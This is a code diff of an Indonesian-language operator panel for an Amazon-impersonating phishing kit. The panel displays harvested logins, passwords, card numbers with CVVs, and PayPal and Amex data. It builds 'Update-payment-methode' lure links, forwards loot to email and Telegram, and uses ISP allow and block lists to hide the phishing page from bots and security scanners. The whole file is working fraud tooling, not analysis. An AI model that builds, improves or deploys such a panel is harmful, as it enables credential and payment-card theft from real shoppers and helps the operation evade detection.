@@ -3,337 +3,496 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel Rahasia — XCHENBA</title>
+    <title>JARVIS MODE — Amazon Tracker</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
         body {
-            background: #f0f2f5;
+            background-color: #050b1c;
             min-height: 100vh;
-            padding: 30px 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        .bg-logo {
-            position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            opacity: 0.04;
-            z-index: 0;
-            pointer-events: none;
-        }
-        .bg-logo img { width: 2000px; height: 2000px; }
-        .wadah { position: relative; z-index: 1; max-width: 700px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { font-size: 26px; color: #1a1a1f; margin-bottom: 5px; }
-        .header p { color: #666; font-size: 14px; }
-        .kotak {
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
-            padding: 25px;
-            margin-bottom: 20px;
-        }
-        .kotak h2 { font-size: 18px; margin-bottom: 18px; color: #222; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        label { display: block; font-weight: 600; margin: 15px 0 6px; font-size: 14px; color: #333; }
-        input {
-            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
-            font-size: 14px; transition: border 0.2s;
-        }
-        input:focus { outline: none; border-color: #0071e3; }
-        .tautan-hasil {
-            background: #f5f5f7;
-            padding: 12px;
-            border-radius: 6px;
-            margin-top: 10px;
-            word-break: break-all;
-            font-size: 13px;
-            color: #1a1a1f;
-            border: 1px solid #e5e5e7;
-        }
-        .salin-btn {
-            margin-top: 8px;
-            padding: 8px 16px;
-            background: #0071e3;
             color: #fff;
+            padding: 20px;
+            position: relative;
+        }
+        /* Latar belakang logo memenuhi seluruh layar */
+        .latar-logo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: url('img/xchenba.png') center/cover no-repeat;
+            opacity: 0.35;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .konten {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .judul-atas {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .judul-atas h1 {
+            font-size: 20px;
+            color: #00e5ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .judul-atas h1 span.ceklis {
+            color: #00ff88;
+        }
+        .judul-atas p {
+            font-size: 11px;
+            color: #88aacc;
+            margin-top: 4px;
+        }
+        .kotak-panel {
+            border: 1px solid #3a5f8a;
+            border-radius: 8px;
+            background: rgba(10, 25, 50, 0.75);
+            padding: 15px 20px;
+            margin-bottom: 18px;
+            box-shadow: 0 0 12px rgba(0, 120, 200, 0.15);
+            backdrop-filter: blur(2px);
+        }
+        .judul-bagian {
+            font-size: 13px;
+            color: #66ccff;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .baris-link {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .input-teks {
+            background: rgba(0, 40, 80, 0.6);
+            border: 1px solid #2a6090;
+            border-radius: 4px;
+            color: #bfe3ff;
+            padding: 8px 12px;
+            font-size: 13px;
+            width: 100%;
+        }
+        .baris-dua {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .tombol {
+            padding: 8px 16px;
             border: none;
             border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
             cursor: pointer;
-            font-size: 14px;
+            transition: transform 0.1s;
         }
-        button {
-            padding: 12px 24px; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
-            transition: all 0.2s; margin-top: 15px;
+        .tombol:hover {
+            transform: scale(1.02);
         }
-        .btn-acak { background: #0071e3; color: #fff; margin-top: 0; }
-        .btn-refresh { background: #34c759; color: #fff; margin-right: 10px; }
-        .btn-refresh.aktif { background: #ff3b30; }
-        .btn-refresh:hover, .btn-acak:hover, .salin-btn:hover { opacity: 0.9; }
-        .info { margin-top: 12px; font-size: 13px; color: #555; line-height: 1.6; }
-        .berhasil { color: #34c759; font-weight: 600; margin-top: 10px; display: none; font-size: 13px; }
-        .daftar-data { margin-top: 15px; }
-        .item {
-            padding: 14px; background: #f8f9fa; border-radius: 6px; margin-bottom: 10px;
-            border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px; line-height: 1.8;
+        .tombol-ungu {
+            background: linear-gradient(to bottom, #b84dff, #992ee0);
+            color: #fff;
         }
-        .item.bot { border-left-color: #ff3b30; background: #fff2f2; }
-        .item.bot .label-tipe { color: #ff3b30; font-weight: bold; }
-        .item span { font-weight: 600; color: #333; display: inline-block; min-width: 90px; }
-        .status-refresh {
-            display: inline-block; margin-left: 10px; font-size: 12px; padding: 4px 10px;
-            border-radius: 12px; background: #e5e5e7; color: #666; font-weight: 600;
+        .tombol-biru {
+            background: linear-gradient(to bottom, #0099ff, #0077dd);
+            color: #fff;
         }
-        .status-refresh.aktif { background: #34c759; color: #fff; }
-        .waktu { font-size: 12px; color: #888; margin-top: 8px; }
-        .baris-dua { display: flex; gap: 12px; }
-        .baris-dua > div { flex: 1; }
-        .kosong { color: #999; font-size: 13px; padding: 10px 0; }
-        .jumlah { font-size: 12px; margin-bottom: 10px; color: #666; }
-        .jumlah span { font-weight: bold; color: #c00; }
+        .tombol-hijau {
+            background: linear-gradient(to bottom, #00cc44, #00aa33);
+            color: #fff;
+        }
+        .tombol-merah {
+            background: linear-gradient(to bottom, #ff4444, #dd2222);
+            color: #fff;
+        }
+        .tombol-oranye {
+            background: linear-gradient(to bottom, #ff7722, #ee5500);
+            color: #fff;
+        }
+        .grid-statistik {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 12px;
+            margin-bottom: 5px;
+        }
+        .kotak-stat {
+            background: rgba(20, 40, 70, 0.6);
+            border: 1px solid #446688;
+            border-radius: 6px;
+            padding: 12px 10px;
+            text-align: center;
+        }
+        .kotak-stat.total { border-color: #ffcc00; }
+        .kotak-stat.human { border-color: #00cc66; }
+        .kotak-stat.bot { border-color: #ff3333; }
+        .kotak-stat.login { border-color: #3399ff; }
+        .kotak-stat.card { border-color: #ffaa00; }
+        .kotak-stat.paypal { border-color: #0099dd; }
+        .kotak-stat.amex { border-color: #00bbbb; }
+        .angka-stat {
+            font-size: 22px;
+            font-weight: 700;
+            margin: 4px 0;
+        }
+        .label-stat {
+            font-size: 11px;
+            color: #99bbddee;
+        }
+        .daftar-isp {
+            background: rgba(0, 30, 60, 0.6);
+            border: 1px solid #2a6090;
+            border-radius: 4px;
+            color: #bfe3ff;
+            padding: 10px 12px;
+            font-size: 12px;
+            width: 100%;
+            min-height: 90px;
+            resize: vertical;
+            font-family: monospace;
+        }
+        .baris-tombol-hapus {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        .tabel-wrapper {
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+        }
+        th {
+            background: rgba(0, 60, 120, 0.6);
+            color: #88ddff;
+            padding: 10px 8px;
+            text-align: left;
+            border-bottom: 1px solid #2a6090;
+        }
+        td {
+            padding: 9px 8px;
+            border-bottom: 1px solid #1a3355;
+            color: #bfe3ff;
+        }
+        tr:hover td {
+            background: rgba(0, 60, 120, 0.3);
+        }
+        .tanda-bot {
+            color: #ff4444;
+            font-weight: 600;
+        }
+        .tanda-ok {
+            color: #00ff88;
+            font-weight: 600;
+        }
+        .terpisah {
+            border-left: 1px solid #2a4466;
+            padding-left: 10px;
+        }
     </style>
 </head>
 <body>
-    <div class="bg-logo"><img src="img/xchenba.png" alt="XCHENBA"></div>
-    <div class="wadah">
-        <div class="header">
-            <h1>🔐 Panel Rahasia</h1>
-            <p>Pengaturan & Pemantauan Data</p>
+
+    <!-- Logo memenuhi seluruh layar -->
+    <div class="latar-logo"></div>
+
+    <div class="konten">
+        <!-- JUDUL ATAS -->
+        <div class="judul-atas">
+            <h1>Xchenba - Amazon Panel <span class="ceklis">✅</span></h1>
+            <p>Auto-refresh setiap 5 detik | Sistem Aktif & Berjalan</p>
         </div>
 
-        <!-- PENGATURAN DASAR -->
-        <div class="kotak">
-            <h2>⚙️ Pengaturan</h2>
-            
-            <label>Alamat Website</label>
-            <input type="text" id="websiteUrl" placeholder="https://update-accountservice.onrender.com" oninput="simpanOtomatis()">
-            
-            <label>Email Penerima</label>
-            <input type="email" id="emailTujuan" placeholder="jandaanaksatu777@gmail.com" oninput="simpanOtomatis()">
-            
-            <label>Telegram Bot Token</label>
-            <input type="text" id="botToken" placeholder="xxx:yyy" oninput="simpanOtomatis()">
-            
-            <label>Telegram Chat ID</label>
-            <input type="text" id="chatIdTelegram" placeholder="123456789" oninput="simpanOtomatis()">
-
-            <p class="berhasil" id="pesanBerhasil">✅ Tersimpan Otomatis!</p>
-            <p class="info">Semua perubahan tersimpan langsung, tidak hilang saat di-refresh</p>
+        <!-- LINK AKTIF -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">🔗 LINK AKTIF</div>
+            <div class="baris-link">
+                <label style="font-size:12px; color:#99ccff;">Bagikan Link :</label>
+                <input type="text" class="input-teks" id="linkAktif" readonly>
+                <input type="text" class="input-teks" id="linkToken" readonly>
+            </div>
         </div>
 
-        <!-- GENERATOR PARAMETER -->
-        <div class="kotak">
-            <h2>🔗 Format Parameter Tautan</h2>
-            
-            <label>Nomor Acak</label>
+        <!-- STATISTIK -->
+        <div class="kotak-panel">
+            <div class="grid-statistik">
+                <div class="kotak-stat total">
+                    <div class="label-stat">TOTAL</div>
+                    <div class="angka-stat" id="jmlTotal">0</div>
+                </div>
+                <div class="kotak-stat human">
+                    <div class="label-stat">👤 HUMAN</div>
+                    <div class="angka-stat" id="jmlHuman">0</div>
+                </div>
+                <div class="kotak-stat bot">
+                    <div class="label-stat">🤖 BOT</div>
+                    <div class="angka-stat" id="jmlBot">0</div>
+                </div>
+                <div class="kotak-stat login">
+                    <div class="label-stat">🔐 LOGIN</div>
+                    <div class="angka-stat" id="jmlLogin">0</div>
+                </div>
+                <div class="kotak-stat card">
+                    <div class="label-stat">💳 CARD</div>
+                    <div class="angka-stat" id="jmlCard">0</div>
+                </div>
+                <div class="kotak-stat paypal">
+                    <div class="label-stat">💰 PAYPAL</div>
+                    <div class="angka-stat" id="jmlPaypal">0</div>
+                </div>
+                <div class="kotak-stat amex">
+                    <div class="label-stat">💳 AMEX</div>
+                    <div class="angka-stat" id="jmlAmex">0</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- UBAH NAMA PARAMETER -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">✏️ UBAH NAMA PARAMETER</div>
             <div class="baris-dua">
-                <input type="number" id="paramAngka" placeholder="123456" oninput="simpanAngkaLaluBuat()">
-                <button class="btn-acak" onclick="acakAngka()">🎲 Acak</button>
+                <input type="text" class="input-teks" id="namaParameter" placeholder="Contoh: anas" style="max-width:200px;">
+                <button class="tombol tombol-ungu" onclick="simpanParameter()">💾 SIMPAN & UBAH</button>
             </div>
-
-            <label>Tautan Lengkap</label>
-            <div class="tautan-hasil" id="tautanHasil">
-                Isi nomor di atas...
-            </div>
-            <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
-            <p class="info" style="margin-top:10px;">
-                Format: <code>?Update-payment-methode-EMAIL-ANGKA=aktif</code><br>
-                Ganti <strong>EMAIL</strong> dengan alamat tujuan<br>
-                <strong style="color:#c00;">⚠️ Tanpa parameter = Terdeteksi BOT & Dialihkan</strong>
-            </p>
+            <p style="font-size:11px; color:#7799bb; margin-top:8px;">Ganti teks di atas → simpan → link otomatis berubah.<br>Contoh: <code>go</code> → link jadi ?go=aktif</p>
         </div>
 
-        <!-- REFRESH OTOMATIS -->
-        <div class="kotak">
-            <h2>🔄 Refresh Otomatis</h2>
-            <button class="btn-refresh" id="tombolRefreshOtomatis" onclick="toggleRefreshOtomatis()">
-                ▶️ Mulai Refresh Setiap 10 Detik
-            </button>
-            <span class="status-refresh" id="statusRefresh">Nonaktif</span>
-            <p class="info">Interval: 10 detik — daftar data diperbarui otomatis</p>
-            <p class="waktu" id="waktuTerakhir">Terakhir diperiksa: —</p>
-        </div>
-
-        <!-- 🤖 PENCATATAN BOT -->
-        <div class="kotak">
-            <h2>🤖 Pengunjung Tanpa Parameter</h2>
-            <div class="jumlah">Total tercatat: <span id="jumlahBot">0</span> orang</div>
-            <div class="daftar-data" id="daftarBot">
-                <p class="kosong">Belum ada data...</p>
+        <!-- EMAIL & TELEGRAM -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">📧 EMAIL & TELEGRAM</div>
+            <div class="baris-dua" style="align-items:flex-start; flex-wrap:wrap; gap:12px;">
+                <div>
+                    <label style="font-size:12px; color:#99ccff; display:block; margin-bottom:4px;">Email Tujuan</label>
+                    <div class="baris-dua" style="gap:6px;">
+                        <input type="email" class="input-teks" id="emailTujuan" placeholder="email@tujuan.com" style="max-width:240px;">
+                        <button class="tombol tombol-biru" onclick="simpanEmail()">📧 SIMPAN EMAIL</button>
+                    </div>
+                </div>
+                <div class="terpisah">
+                    <label style="font-size:12px; color:#99ccff; display:block; margin-bottom:4px;">Token Bot</label>
+                    <input type="text" class="input-teks" id="tokenTelegram" placeholder="Token Bot" style="max-width:260px;">
+                </div>
+                <div>
+                    <label style="font-size:12px; color:#99ccff; display:block; margin-bottom:4px;">Chat ID</label>
+                    <div class="baris-dua" style="gap:6px;">
+                        <input type="text" class="input-teks" id="chatTelegram" placeholder="Chat ID" style="max-width:160px;">
+                        <button class="tombol tombol-biru" onclick="simpanTelegram()">✈️ SIMPAN TELEGRAM</button>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <!-- DATA LOGIN MASUK -->
-        <div class="kotak">
-            <h2>📧 Data Login Masuk</h2>
-            <div class="jumlah">Total: <span id="jumlahLogin">0</span> orang</div>
-            <div class="daftar-data" id="daftarLogin">
-                <p class="kosong">Belum ada data...</p>
+        <!-- WHITELIST ISP -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">✅ WHITELIST ISP — Dianggap HUMAN</div>
+            <textarea class="daftar-isp" id="daftarWhitelist" placeholder="Masukkan nama ISP, satu per baris&#10;Contoh:&#10;PT Telekomunikasi Selular&#10;Indosat&#10;Telkomsel"></textarea>
+            <button class="tombol tombol-hijau" style="margin-top:10px;" onclick="simpanWhitelist()">💾 SIMPAN DAFTAR</button>
+        </div>
+
+        <!-- BLOCK ISP -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">🚫 BLOCK ISP — Dianggap BOT</div>
+            <textarea class="daftar-isp" id="daftarBlacklist" placeholder="Masukkan nama ISP, satu per baris&#10;Contoh:&#10;Tencent Cloud&#10;Google LLC&#10;Cloudflare"></textarea>
+            <button class="tombol tombol-oranye" style="margin-top:10px;" onclick="simpanBlacklist()">💾 SIMPAN DAFTAR</button>
+        </div>
+
+        <!-- HAPUS DATA -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">🗑️ HAPUS DATA</div>
+            <div class="baris-tombol-hapus">
+                <button class="tombol tombol-merah" onclick="hapusPengunjung()">CLEAR VISITOR</button>
+                <button class="tombol tombol-hijau" onclick="hapusHuman()">CLEAR HUMAN</button>
+                <button class="tombol tombol-biru" onclick="hapusPaypal()">CLEAR PAYPAL</button>
+                <button class="tombol tombol-biru" onclick="hapusAmex()">CLEAR AMEX</button>
+                <button class="tombol tombol-merah" onclick="hapusSemua()">CLEAR ALL</button>
             </div>
         </div>
 
-        <!-- DATA KARTU MASUK -->
-        <div class="kotak">
-            <h2>💳 Data Kartu Masuk</h2>
-            <div class="jumlah">Total: <span id="jumlahKartu">0</span> orang</div>
-            <div class="daftar-data" id="daftarKartu">
-                <p class="kosong">Belum ada data...</p>
+        <!-- RIWAYAT PENGUNJUNG -->
+        <div class="kotak-panel">
+            <div class="judul-bagian">📋 RIWAYAT PENGUNJUNG</div>
+            <div class="tabel-wrapper">
+                <table id="tabelRiwayat">
+                    <thead>
+                        <tr>
+                            <th>IP</th>
+                            <th>Negara</th>
+                            <th>ISP</th>
+                            <th>Status</th>
+                            <th>Halaman</th>
+                            <th>Waktu</th>
+                        </tr>
+                    </thead>
+                    <tbody id="isiTabel">
+                        <tr>
+                            <td colspan="6" style="text-align:center; color:#6688aa; padding:20px;">Belum ada pengunjung...</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 
-    <script>
-        let intervalRefresh = null;
-        const INTERVAL_DETIK = 10;
+<script>
+// === INISIALISASI NILAI ===
+const defaultParam = 'Update-payment-methode';
 
-        // === MUAT SAAT BUKA ===
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('websiteUrl').value = localStorage.getItem('websiteUrl') || '';
-            document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
-            document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
-            document.getElementById('chatIdTelegram').value = localStorage.getItem('chatIdTelegram') || '';
-            
-            const simpanAngka = localStorage.getItem('paramAngka');
-            if (simpanAngka) document.getElementById('paramAngka').value = simpanAngka;
-            
-            tampilkanSemuaData();
-            perbaruiWaktuTerakhir();
-            buatTautan();
-        });
+// Muat dari localStorage
+function muatPengaturan() {
+    document.getElementById('namaParameter').value = localStorage.getItem('namaParameter') || defaultParam;
+    document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
+    document.getElementById('tokenTelegram').value = localStorage.getItem('tokenTelegram') || '';
+    document.getElementById('chatTelegram').value = localStorage.getItem('chatTelegram') || '';
+    document.getElementById('daftarWhitelist').value = localStorage.getItem('daftarWhitelist') || '';
+    document.getElementById('daftarBlacklist').value = localStorage.getItem('daftarBlacklist') || '';
+    perbaruiLink();
+    perbaruiStatistik();
+    muatRiwayat();
+}
 
-        // === SIMPAN OTOMATIS ===
-        function simpanOtomatis() {
-            localStorage.setItem('websiteUrl', document.getElementById('websiteUrl').value.trim());
-            localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
-            localStorage.setItem('botTokenTelegram', document.getElementById('botToken').value.trim());
-            localStorage.setItem('chatIdTelegram', document.getElementById('chatIdTelegram').value.trim());
-            
-            const pesan = document.getElementById('pesanBerhasil');
-            pesan.style.display = 'block';
-            setTimeout(() => pesan.style.display = 'none', 1500);
-            buatTautan();
-        }
+// Perbarui tampilan link
+function perbaruiLink() {
+    const param = document.getElementById('namaParameter').value || defaultParam;
+    const asal = window.location.origin;
+    document.getElementById('linkAktif').value = `${asal}/amazon.html?${param}-email@anda.com-123=aktif`;
+    document.getElementById('linkToken').value = `${asal}/amazon.html?${param}-TOKEN=aktif`;
+}
 
-        function simpanAngkaLaluBuat() {
-            localStorage.setItem('paramAngka', document.getElementById('paramAngka').value.trim());
-            buatTautan();
-        }
+// Simpan parameter
+function simpanParameter() {
+    localStorage.setItem('namaParameter', document.getElementById('namaParameter').value);
+    perbaruiLink();
+    alert('✅ Parameter disimpan! Link telah diperbarui.');
+}
 
-        function acakAngka() {
-            const acak = Math.floor(Math.random() * 900000) + 100000;
-            document.getElementById('paramAngka').value = acak;
-            localStorage.setItem('paramAngka', acak);
-            buatTautan();
-        }
+// Simpan Email
+function simpanEmail() {
+    localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value);
+    alert('✅ Email tujuan disimpan!');
+}
 
-        function buatTautan() {
-            const url = document.getElementById('websiteUrl').value.trim();
-            const angka = document.getElementById('paramAngka').value.trim();
-            const hasil = document.getElementById('tautanHasil');
-            
-            if (!url || !angka) {
-                hasil.innerHTML = '<span style="color:#888;">Isi nomor di atas...</span>';
-                return;
-            }
-            hasil.innerHTML = `${url}/?Update-payment-methode-EMAIL-${angka}=aktif`;
-        }
+// Simpan Telegram
+function simpanTelegram() {
+    localStorage.setItem('tokenTelegram').value = document.getElementById('tokenTelegram').value;
+    localStorage.setItem('chatTelegram').value = document.getElementById('chatTelegram').value;
+    alert('✅ Data Telegram disimpan!');
+}
 
-        function salinTautan() {
-            const teks = document.getElementById('tautanHasil').innerText;
-            if (!teks.includes('Isi')) {
-                navigator.clipboard.writeText(teks).then(() => {
-                    alert('✅ Tautan disalin! Ganti kata EMAIL dengan alamat yang diinginkan');
-                });
-            }
-        }
+// Simpan Whitelist
+function simpanWhitelist() {
+    localStorage.setItem('daftarWhitelist', document.getElementById('daftarWhitelist').value);
+    alert('✅ Daftar Whitelist disimpan!');
+}
 
-        function toggleRefreshOtomatis() {
-            const tombol = document.getElementById('tombolRefreshOtomatis');
-            const status = document.getElementById('statusRefresh');
-            
-            if (intervalRefresh) {
-                clearInterval(intervalRefresh);
-                intervalRefresh = null;
-                tombol.textContent = '▶️ Mulai Refresh Setiap 10 Detik';
-                tombol.classList.remove('aktif');
-                status.textContent = 'Nonaktif';
-                status.classList.remove('aktif');
-            } else {
-                tampilkanSemuaData();
-                perbaruiWaktuTerakhir();
-                intervalRefresh = setInterval(function() {
-                    tampilkanSemuaData();
-                    perbaruiWaktuTerakhir();
-                }, INTERVAL_DETIK * 1000);
-                tombol.textContent = '⏹️ Hentikan Refresh Otomatis';
-                tombol.classList.add('aktif');
-                status.textContent = 'Aktif';
-                status.classList.add('aktif');
-            }
-        }
+// Simpan Blacklist
+function simpanBlacklist() {
+    localStorage.setItem('daftarBlacklist', document.getElementById('daftarBlacklist').value);
+    alert('✅ Daftar Blacklist disimpan!');
+}
 
-        // === TAMPILKAN SEMUA DATA ===
-        function tampilkanSemuaData() {
-            // 🤖 BOT
-            const daftarBot = document.getElementById('daftarBot');
-            const dataBot = JSON.parse(localStorage.getItem('daftarBot') || '[]');
-            document.getElementById('jumlahBot').textContent = dataBot.length;
-            
-            if (dataBot.length === 0) {
-                daftarBot.innerHTML = '<p class="kosong">Belum ada pengunjung tanpa parameter...</p>';
-            } else {
-                daftarBot.innerHTML = dataBot.map(d => `
-                    <div class="item bot">
-                        <span class="label-tipe">🤖 BOT — Mengakses tanpa parameter</span><br>
-                        <span>📅 Waktu:</span> ${d.waktu || '-'}
-                    </div>
-                `).join('');
-            }
+// Hitung & tampilkan statistik
+function perbaruiStatistik() {
+    const riwayat = JSON.parse(localStorage.getItem('riwayatPengunjung') || '[]');
+    const login = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
+    const kartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
+    const paypal = JSON.parse(localStorage.getItem('daftarPaypal') || '[]');
+    const amex = JSON.parse(localStorage.getItem('daftarAmex') || '[]');
+    
+    const total = riwayat.length;
+    const human = riwayat.filter(r => !r.isBot).length;
+    const bot = riwayat.filter(r => r.isBot).length;
 
-            // 📧 LOGIN
-            const daftarLogin = document.getElementById('daftarLogin');
-            const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
-            document.getElementById('jumlahLogin').textContent = dataLogin.length;
-            
-            if (dataLogin.length === 0) {
-                daftarLogin.innerHTML = '<p class="kosong">Belum ada data...</p>';
-            } else {
-                daftarLogin.innerHTML = dataLogin.map(d => `
-                    <div class="item ${d.isBot ? 'bot' : ''}">
-                        ${d.isBot ? '<span class="label-tipe">🤖 BOT</span><br>' : ''}
-                        <span>📧 Email:</span> ${d.email || '-'}<br>
-                        <span>🔑 Kata Sandi:</span> ${d.sandi || '-'}<br>
-                        <span>🕐 Waktu:</span> ${d.waktu || '-'}
-                    </div>
-                `).join('');
-            }
+    document.getElementById('jmlTotal').textContent = total;
+    document.getElementById('jmlHuman').textContent = human;
+    document.getElementById('jmlBot').textContent = bot;
+    document.getElementById('jmlLogin').textContent = login.length;
+    document.getElementById('jmlCard').textContent = kartu.length;
+    document.getElementById('jmlPaypal').textContent = paypal.length;
+    document.getElementById('jmlAmex').textContent = amex.length;
+}
 
-            // 💳 KARTU
-            const daftarKartu = document.getElementById('daftarKartu');
-            const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
-            document.getElementById('jumlahKartu').textContent = dataKartu.length;
-            
-            if (dataKartu.length === 0) {
-                daftarKartu.innerHTML = '<p class="kosong">Belum ada data...</p>';
-            } else {
-                daftarKartu.innerHTML = dataKartu.map(d => `
-                    <div class="item ${d.isBot ? 'bot' : ''}">
-                        ${d.isBot ? '<span class="label-tipe">🤖 BOT</span><br>' : ''}
-                        <span>📧 Email:</span> ${d.email || '-'}<br>
-                        <span>👤 Nama:</span> ${d.namaKartu || '-'}<br>
-                        <span>🔢 Kartu:</span> ${d.nomorKartu || '-'}<br>
-                        <span>📅 Exp:</span> ${d.expiry || '-'}<br>
-                        <span>🔒 CVV:</span> ${d.cvv || '-'}<br>
-                        <span>📍 Alamat:</span> ${d.alamat || '-'} — ${d.kodepos || '-'}<br>
-                        <span>📞 Telp:</span> ${d.telepon || '-'}<br>
-                        <span>🕐 Waktu:</span> ${d.waktu || '-'}
-                    </div>
-                `).join('');
-            }
-        }
+// Muat daftar riwayat
+function muatRiwayat() {
+    const riwayat = JSON.parse(localStorage.getItem('riwayatPengunjung') || '[]');
+    const tbody = document.getElementById('isiTabel');
+    
+    if (riwayat.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#6688aa; padding:20px;">Belum ada pengunjung...</td></tr>`;
+        return;
+    }
 
-        function perbaruiWaktuTerakhir() {
-            document.getElementById('waktuTerakhir').textContent = 
-                'Terakhir diperiksa: ' + new Date().toLocaleString('id-ID');
-        }
-    </script>
+    tbody.innerHTML = riwayat.map(r => `
+        <tr>
+            <td>${r.ip || '-'}</td>
+            <td>${r.negara || '-'}</td>
+            <td>${r.isp || '-'}</td>
+            <td>${r.isBot ? '<span class="tanda-bot">❌ BOT</span>' : '<span class="tanda-ok">✅ HUMAN</span>'}</td>
+            <td>${r.halaman || '-'}</td>
+            <td>${r.waktu || '-'}</td>
+        </tr>
+    `).join('');
+}
+
+// Fungsi Hapus Data
+function hapusPengunjung() {
+    if(confirm('Yakin hapus riwayat pengunjung?')) {
+        localStorage.removeItem('riwayatPengunjung');
+        muatRiwayat(); perbaruiStatistik();
+    }
+}
+function hapusHuman() {
+    if(confirm('Yakin hapus data HUMAN?')) {
+        localStorage.setItem('riwayatPengunjung', JSON.stringify(
+            JSON.parse(localStorage.getItem('riwayatPengunjung')||'[]').filter(r=>r.isBot)
+        ));
+        muatRiwayat(); perbaruiStatistik();
+    }
+}
+function hapusPaypal() {
+    if(confirm('Yakin hapus data PAYPAL?')) {
+        localStorage.removeItem('daftarPaypal'); perbaruiStatistik();
+    }
+}
+function hapusAmex() {
+    if(confirm('Yakin hapus data AMEX?')) {
+        localStorage.removeItem('daftarAmex'); perbaruiStatistik();
+    }
+}
+function hapusSemua() {
+    if(confirm('⚠️ Yakin HAPUS SEMUA DATA? Tidak bisa dikembalikan!')) {
+        localStorage.clear();
+        muatRiwayat(); perbaruiStatistik();
+        alert('✅ Semua data telah dihapus!');
+    }
+}
+
+// Auto-refresh setiap 5 detik
+setInterval(() => {
+    muatRiwayat();
+    perbaruiStatistik();
+}, 5000);
+
+// Jalankan saat halaman dibuka
+muatPengaturan();
+</script>
+
 </body>
 </html>
